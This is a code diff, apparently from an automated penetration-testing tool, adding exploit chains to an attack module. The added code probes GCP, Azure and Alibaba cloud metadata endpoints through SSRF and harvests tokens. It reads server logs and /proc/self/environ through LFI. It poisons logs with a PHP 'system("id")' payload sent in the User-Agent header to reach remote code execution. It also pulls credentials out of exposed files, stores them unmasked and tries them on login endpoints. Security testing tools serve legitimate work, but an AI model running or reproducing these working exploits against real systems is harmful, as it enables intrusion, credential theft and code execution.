+                if any(ind in resp.text for ind in ["project", "instance", "attributes"]):
+                    cloud_accessible.append({
+                        "target": "GCP metadata",
+                        "description": "GCP metadata (project, instance info)",
+                        "snippet": resp.text[:300],
+                    })
+                    for token, ttype in _extract_tokens(resp.text):
+                        chain_ctx.add_token(token, "gcp_metadata")
+
+            # Azure metadata
+            resp = await _ssrf_fetch(
+                client,
+                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+            )
+            if _is_real_response(resp):
+                if any(ind in resp.text for ind in ["vmId", "subscriptionId", "resourceGroup"]):
+                    cloud_accessible.append({
+                        "target": "Azure metadata",
+                        "description": "Azure instance metadata",
+                        "snippet": resp.text[:300],
+                    })
+
+            # Alibaba
+            resp = await _ssrf_fetch(
+                client,
+                "http://100.100.100.200/latest/meta-data/",
+            )
+            if _is_real_response(resp):
+                if any(ind in resp.text for ind in ["instance-id", "region-id"]):
+                    cloud_accessible.append({
+                        "target": "Alibaba Cloud metadata",
+                        "description": "Alibaba Cloud metadata",
+                        "snippet": resp.text[:300],
+                    })
 
         if cloud_accessible:
             evidence.append({
@@ -1138,13 +1593,34 @@ class AttackChainModule:
             })
             steps_completed = 3
 
-        # Step 4: Summary of accessible services
+        # Step 4: Follow up on discovered internal URLs
+        secondary_discoveries = []
+        if chain_ctx.internal_urls:
+            async with make_client(timeout=10.0) as client:
+                for iu in chain_ctx.internal_urls[:10]:
+                    iurl = iu["url"]
+                    if iurl in [a["target"] for a in accessible_internal]:
+                        continue
+                    resp = await _ssrf_fetch(client, iurl)
+                    if _is_real_response(resp):
+                        secondary_discoveries.append(iurl)
+                        for token, ttype in _extract_tokens(resp.text):
+                            chain_ctx.add_token(token, f"ssrf_secondary_{iurl}")
+
+        # Step 5: Summary
         all_accessible = accessible_internal + cloud_accessible
-        if all_accessible:
+        has_credentials = bool(chain_ctx.tokens or chain_ctx.credentials)
+
+        if all_accessible or secondary_discoveries:
             evidence.append({
                 "step": 4,
-                "action": "Compiled internal access report",
-                "result": f"Total accessible: {len(all_accessible)} internal services/endpoints",
+                "action": "Compiled full SSRF impact report",
+                "result": (
+                    f"Total: {len(all_accessible)} services, "
+                    f"{len(secondary_discoveries)} secondary discoveries, "
+                    f"{len(chain_ctx.tokens)} tokens extracted, "
+                    f"{len(chain_ctx.credentials)} credentials found"
+                ),
             })
             steps_completed = 4
 
@@ -1157,14 +1633,20 @@ class AttackChainModule:
                    if accessible_internal else "")
                 + (f"Cloud metadata: {', '.join(c['description'] for c in cloud_accessible[:3])}. "
                    if cloud_accessible else "")
+                + (f"IAM role: {iam_role_name}. " if iam_role_name else "")
+                + (f"Tokens/credentials extracted: {len(chain_ctx.tokens)} tokens, {len(chain_ctx.credentials)} creds. "
+                   if has_credentials else "")
                 + (f"Total {len(all_accessible)} internal endpoints accessible."
                    if all_accessible else "Network appears segmented.")
             ),
             "verified": bool(all_accessible),
         }
 
-    async def _exec_auth_bypass_admin(self, trigger: dict, ctx: dict) -> dict:
+    async def _exec_auth_bypass_admin(self, trigger: dict, ctx: dict,
+                                      chain_ctx: ChainContext = None) -> dict:
         """Auth Bypass -> Admin Panel -> Admin Function Enumeration chain."""
+        if chain_ctx is None:
+            chain_ctx = ChainContext()
         url = trigger.get("url", "")
         base_url = ctx.get("base_url", "")
         evidence = []
@@ -1271,8 +1753,11 @@ class AttackChainModule:
             "verified": bool(admin_accessible),
         }
 
-    async def _exec_info_disclosure_further(self, trigger: dict, ctx: dict) -> dict:
-        """Info Disclosure -> Extract Credentials -> Test Access chain."""
+    async def _exec_info_disclosure_further(self, trigger: dict, ctx: dict,
+                                             chain_ctx: ChainContext = None) -> dict:
+        """Info Disclosure -> Extract Credentials -> SSRF Internal -> Test Access chain."""
+        if chain_ctx is None:
+            chain_ctx = ChainContext()
         url = trigger.get("url", "")
         base_url = ctx.get("base_url", "")
         evidence = []
@@ -1301,6 +1786,7 @@ class AttackChainModule:
         async with make_client(timeout=10.0) as client:
             try:
                 resp = await client.get(url)
+                chain_ctx.add_response(1, url, resp.status_code, resp.text)
                 if resp.status_code == 200:
                     body = resp.text
 
@@ -1325,9 +1811,9 @@ class AttackChainModule:
                     for pattern, desc in cred_patterns:
                         matches = re.findall(pattern, body, re.IGNORECASE)
                         for match in matches:
-                            # Mask the actual credential
                             masked = match[:3] + "***" if len(match) > 3 else "***"
                             creds_found.append(f"{desc}: {masked}")
+                            chain_ctx.add_credential(desc, match, f"info_disclosure:{url}")
 
                     # Look for API keys
                     api_patterns = [
@@ -1339,8 +1825,18 @@ class AttackChainModule:
                     ]
 
                     for pattern, desc in api_patterns:
-                        if re.search(pattern, body, re.IGNORECASE):
+                        m = re.search(pattern, body, re.IGNORECASE)
+                        if m:
                             api_keys_found.append(desc)
+                            chain_ctx.add_token(m.group(0), f"info_disclosure_{desc}")
+
+                    # Extract internal URLs from the file
+                    for iurl in _extract_internal_urls(body):
+                        chain_ctx.add_internal_url(iurl, f"from_exposed_file:{url}")
+
+                    # Extract tokens
+                    for token, ttype in _extract_tokens(body):
+                        chain_ctx.add_token(token, f"info_disclosure:{ttype}")
             except Exception:
                 pass
 
@@ -1734,6 +2230,284 @@ class AttackChainModule:
         except Exception as e:
             return {"verified": False, "reason": f"XXE test failed: {e}"}
 
+    # ═══════════════════════════════════════════════════════════════════
+    # NEW Chain Executors: LFI→Log Poisoning→RCE, Info→SSRF
+    # ═══════════════════════════════════════════════════════════════════
+
+    async def _exec_lfi_log_poisoning_rce(self, trigger: dict, ctx: dict,
+                                           chain_ctx: ChainContext = None) -> dict:
+        """LFI → Read Log → Inject PHP via UA → Include Log → RCE."""
+        if chain_ctx is None:
+            chain_ctx = ChainContext()
+        url = trigger.get("url", "")
+        param = trigger.get("parameter", "")
+        base_url = ctx.get("base_url", "")
+        evidence = []
+        steps_completed = 0
+
+        if not url or not param:
+            return {
+                "steps_completed": 0, "evidence": [],
+                "impact": "LFI confirmed but parameter missing.", "verified": False,
+            }
+
+        # Step 1: Read log files via LFI
+        log_paths = [
+            "/var/log/apache2/access.log",
+            "/var/log/nginx/access.log",
+            "/var/log/httpd/access_log",
+            "/var/log/apache2/error.log",
+            "/var/log/nginx/error.log",
+            "/proc/self/environ",
+            "/proc/self/fd/0",
+        ]
+
+        readable_log = ""
+        readable_log_path = ""
+        async with make_client(timeout=10.0) as client:
+            for log_path in log_paths:
+                try:
+                    resp = await client.get(url, params={param: log_path})
+                    chain_ctx.add_response(1, url, resp.status_code, resp.text)
+                    if resp.status_code == 200 and any(
+                        ind in resp.text for ind in ("GET /", "HTTP/1", "Mozilla", "SERVER_", "PATH=", "POST /")
+                    ):
+                        readable_log = resp.text[:3000]
+                        readable_log_path = log_path
+                        chain_ctx.add_file(log_path, readable_log)
+                        break
+                except Exception:
+                    continue
+
+        if readable_log:
+            evidence.append({
+                "step": 1,
+                "action": f"Read server log via LFI: {readable_log_path}",
+                "result": f"Log file readable ({len(readable_log)} chars)",
+            })
+            steps_completed = 1
+        else:
+            evidence.append({
+                "step": 1,
+                "action": "Attempted to read server logs via LFI",
+                "result": "No readable log files found",
+            })
+            return {
+                "steps_completed": 1, "evidence": evidence,
+                "impact": "LFI confirmed but log files not readable for poisoning.",
+                "verified": False,
+            }
+
+        # Step 2: Inject PHP payload via User-Agent to poison the log
+        import random
+        rce_marker = f"phantom_rce_{random.randint(10000, 99999)}"
+        php_payload = f'<?php echo "{rce_marker}"; system("id"); ?>'
+
+        poison_success = False
+        async with make_client(
+            extra_headers={"User-Agent": php_payload}, timeout=10.0,
+        ) as client:
+            try:
+                # Just make a request so it gets logged
+                resp = await client.get(base_url or url)
+                chain_ctx.add_response(2, base_url or url, resp.status_code, "poison request sent")
+                poison_success = True
+            except Exception:
+                pass
+
+        if poison_success:
+            evidence.append({
+                "step": 2,
+                "action": "Injected PHP payload via User-Agent header",
+                "result": f"Sent request with UA: {php_payload[:60]}...",
+            })
+            steps_completed = 2
+        else:
+            evidence.append({
+                "step": 2,
+                "action": "Attempted log poisoning via User-Agent",
+                "result": "Could not send poison request",
+            })
+            steps_completed = 2
+
+        # Step 3: Include the poisoned log file and check for RCE output
+        rce_confirmed = False
+        rce_output = ""
+        if poison_success and readable_log_path:
+            async with make_client(timeout=10.0) as client:
+                try:
+                    resp = await client.get(url, params={param: readable_log_path})
+                    chain_ctx.add_response(3, url, resp.status_code, resp.text)
+                    if rce_marker in resp.text:
+                        rce_confirmed = True
+                        # Extract command output near the marker
+                        idx = resp.text.find(rce_marker)
+                        rce_output = resp.text[idx:idx + 200]
+                except Exception:
+                    pass
+
+        if rce_confirmed:
+            evidence.append({
+                "step": 3,
+                "action": "Included poisoned log file via LFI",
+                "result": f"RCE CONFIRMED! Output: {rce_output[:150]}",
+            })
+            steps_completed = 3
+        else:
+            evidence.append({
+                "step": 3,
+                "action": "Attempted to include poisoned log file",
+                "result": "PHP not executed (server may not use PHP or log format differs)",
+            })
+            steps_completed = 3
+
+        return {
+            "steps_completed": steps_completed,
+            "evidence": evidence,
+            "impact": (
+                f"LFI → Log Poisoning chain. Log readable: {readable_log_path}. "
+                + ("RCE CONFIRMED via log poisoning!" if rce_confirmed
+                   else "Log poisoning attempted but RCE not confirmed (may need manual testing).")
+            ),
+            "verified": rce_confirmed,
+        }
+
+    async def _exec_info_to_ssrf(self, trigger: dict, ctx: dict,
+                                  chain_ctx: ChainContext = None) -> dict:
+        """Info Disclosure → Extract Internal URLs → Access Internal Services."""
+        if chain_ctx is None:
+            chain_ctx = ChainContext()
+        url = trigger.get("url", "")
+        base_url = ctx.get("base_url", "")
+        evidence = []
+        steps_completed = 0
+
+        if not url:
+            return {
+                "steps_completed": 0, "evidence": [],
+                "impact": "Info disclosure URL missing.", "verified": False,
+            }
+
+        # Step 1: Fetch the exposed file
+        file_content = ""
+        async with make_client(timeout=10.0) as client:
+            try:
+                resp = await client.get(url)
+                chain_ctx.add_response(1, url, resp.status_code, resp.text)
+                if resp.status_code == 200:
+                    file_content = resp.text
+            except Exception:
+                pass
+
+        evidence.append({
+            "step": 1,
+            "action": f"Fetched exposed file at {url}",
+            "result": f"Got {len(file_content)} chars" if file_content else "Could not fetch",
+        })
+        steps_completed = 1
+
+        if not file_content:
+            return {
+                "steps_completed": 1, "evidence": evidence,
+                "impact": "Info disclosure URL not accessible.", "verified": False,
+            }
+
+        # Step 2: Extract internal URLs and credentials
+        internal_urls = _extract_internal_urls(file_content)
+        for iurl in internal_urls:
+            chain_ctx.add_internal_url(iurl, "from_disclosed_file")
+
+        creds = _extract_credentials(file_content)
+        for val, ctype, _ in creds:
+            chain_ctx.add_credential(ctype, val, f"info_disclosure:{url}")
+
+        tokens = _extract_tokens(file_content)
+        for token, ttype in tokens:
+            chain_ctx.add_token(token, f"info_disclosure:{url}")
+
+        evidence.append({
+            "step": 2,
+            "action": "Extracted internal URLs and credentials from disclosed file",
+            "result": (
+                f"Internal URLs: {len(internal_urls)}, "
+                f"Credentials: {len(creds)}, Tokens: {len(tokens)}"
+            ),
+        })
+        steps_completed = 2
+
+        # Step 3: Try to access internal URLs directly
+        internal_accessible = []
+        if internal_urls:
+            async with make_client(timeout=8.0) as client:
+                for iurl in internal_urls[:10]:
+                    try:
+                        resp = await client.get(iurl)
+                        chain_ctx.add_response(3, iurl, resp.status_code, resp.text)
+                        if resp.status_code == 200 and len(resp.text) > 20:
+                            internal_accessible.append(iurl)
+                            for token, ttype in _extract_tokens(resp.text):
+                                chain_ctx.add_token(token, f"internal_service:{iurl}")
+                    except Exception:
+                        continue
+
+        if internal_accessible:
+            evidence.append({
+                "step": 3,
+                "action": "Accessed internal services via discovered URLs",
+                "result": f"Accessible: {', '.join(internal_accessible[:5])}",
+            })
+            steps_completed = 3
+        elif internal_urls:
+            evidence.append({
+                "step": 3,
+                "action": "Attempted to access internal URLs",
+                "result": "Internal URLs not directly reachable from external network",
+            })
+            steps_completed = 3
+
+        # Step 4: Try credentials on login endpoints
+        login_success = False
+        if chain_ctx.credentials and base_url:
+            login_paths = ["/admin/login", "/login", "/api/auth/login", "/api/login"]
+            cred = chain_ctx.get_best_credential()
+            if cred:
+                async with make_client(timeout=10.0) as client:
+                    for lpath in login_paths:
+                        try:
+                            login_url = base_url.rstrip("/") + lpath
+                            resp = await client.post(login_url, json={
+                                "username": cred["username"],
+                                "password": cred["password"],
+                            })
+                            if resp.status_code in (200, 302):
+                                for token, ttype in _extract_tokens(resp.text):
+                                    chain_ctx.add_token(token, "info_chain_login")
+                                login_success = True
+                                break
+                        except Exception:
+                            continue
+
+            if login_success:
+                evidence.append({
+                    "step": 4,
+                    "action": "Used extracted credentials to authenticate",
+                    "result": "Login successful with leaked credentials",
+                })
+                steps_completed = 4
+
+        return {
+            "steps_completed": steps_completed,
+            "evidence": evidence,
+            "impact": (
+                f"Info disclosure reveals internal configuration. "
+                + (f"Internal URLs found: {len(internal_urls)}. " if internal_urls else "")
+                + (f"Credentials extracted: {len(creds)}. " if creds else "")
+                + (f"Internal services accessible: {len(internal_accessible)}. " if internal_accessible else "")
+                + ("Login with leaked credentials succeeded." if login_success else "")
+            ),
+            "verified": bool(creds or tokens or internal_accessible),
+        }
+
     # ── New chain test methods that delegate to executors ──
 
     async def _chain_sqli_data_exfil(self, trigger, vulns, base_url, ctx) -> dict:
@@ -1769,4 +2543,14 @@ class AttackChainModule:
     async def _chain_info_disclosure_further(self, trigger, vulns, base_url, ctx) -> dict:
         """Test info disclosure further attack chain."""
         result = await self._exec_info_disclosure_further(trigger, ctx)
+        return {"verified": result.get("verified", False), "evidence": result}
+
+    async def _chain_lfi_log_poisoning_rce(self, trigger, vulns, base_url, ctx) -> dict:
+        """Test LFI log poisoning RCE chain."""
+        result = await self._exec_lfi_log_poisoning_rce(trigger, ctx)
+        return {"verified": result.get("verified", False), "evidence": result}
+
+    async def _chain_info_to_ssrf(self, trigger, vulns, base_url, ctx) -> dict:
+        """Test info disclosure to SSRF chain."""
+        result = await self._exec_info_to_ssrf(trigger, ctx)
         return {"verified": result.get("verified", False), "evidence": result}
